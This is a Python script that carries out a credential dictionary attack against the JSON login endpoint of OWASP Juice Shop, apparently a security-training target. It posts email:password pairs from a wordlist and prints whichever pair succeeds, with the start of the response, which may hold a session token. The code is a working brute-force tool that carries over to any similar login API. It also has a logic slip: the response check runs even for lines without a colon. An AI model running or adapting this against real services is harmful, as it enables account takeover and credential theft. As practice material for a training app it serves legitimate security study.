import requests
import sys
import os

WORDLIST_FILE = "creds.txt"

EMAIL_KEY = "email"
PASSWORD_KEY = "password"

FAILURE_STRING = "Invalid email or password."

def run_json_dictionary_attack():
	try:
		IP_ADDRESS = os.environ['OWASP_JUICE_SHOP_IP_ADDRESS']
		PORT = os.environ['OWASP_JUICE_SHOP_PORT']
		TARGET_URL = f"http://{IP_ADDRESS}:{PORT}/rest/user/login"
		
		headers = {
			'Content-Type': 'application/json'
		}

		with open(WORDLIST_FILE, 'r') as f:
			for line in f:
				line = line.strip()
				if ":" in line:
					email, password = line.split(":", 1)
					json_payload = {
						EMAIL_KEY: email,
						PASSWORD_KEY: password
					}
					response = requests.post(TARGET_URL, json=json_payload, headers=headers, timeout=50)

				if response.status_code < 400 and FAILURE_STRING not in response.text:
					print(f"\n **SUCCESS** ")
					print(f"Username: {email}")
					print(f"Password: {password}")
					print(f"Status Code: {response.status_code}")
					# Print API response for token or session data
					print(f"Response: {response.text[:100]}...") 
					break

				elif response.status_code == 401:
					print(f"[-] Failed (401 Unauthorized) with: {email}:{password}")
					print(f"Response: {response.text}...") 
				elif FAILURE_STRING in response.text:
					print(f"[-] Failed (Failure String Found) with: {password}")
				else:
					print(f"[-] Failed (Status {response.status_code}) with: {password}")

			print("-" * 50)
			print("Attack complete.")
	except Exception as e:
		print(f"[*] An error occurred: {e}")
		sys.exit(1)

if __name__ == "__main__":
	run_json_dictionary_attack()
